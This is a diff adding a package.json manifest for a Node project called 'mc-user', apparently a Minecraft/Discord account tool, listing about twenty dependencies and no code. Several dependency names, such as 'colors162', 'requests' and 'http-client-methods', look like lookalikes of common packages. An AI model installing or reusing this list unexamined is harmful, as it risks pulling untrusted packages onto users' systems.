@@ -1,0 +1,34 @@
+{
+  "name": "mc-user",
+  "version": "1.0.0",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "keywords": [],
+  "author": "",
+  "license": "ISC",
+  "dependencies": {
+    "@baggie/core": "^1.5.0",
+    "axios": "^1.5.1",
+    "chalk": "^3.0.0",
+    "colors162": "^1.3.3",
+    "discord.js": "^14.13.0",
+    "dotenv": "^16.3.1",
+    "fs": "^0.0.1-security",
+    "http-client-methods": "^1.0.4",
+    "https-proxy-agent": "^7.0.2",
+    "hyperquest": "^2.1.3",
+    "json": "^11.0.0",
+    "mojang-api": "^0.0.2",
+    "mojang-lib": "^1.13.0",
+    "moment": "^2.29.4",
+    "pendel": "^3.0.0",
+    "readline-sync": "^1.4.10",
+    "requests": "^0.3.0",
+    "ticktalk": "^1.1.1",
+    "xhr2": "^0.2.1",
+    "xmlhttprequest-ssl": "^2.1.1"
+  }
+}
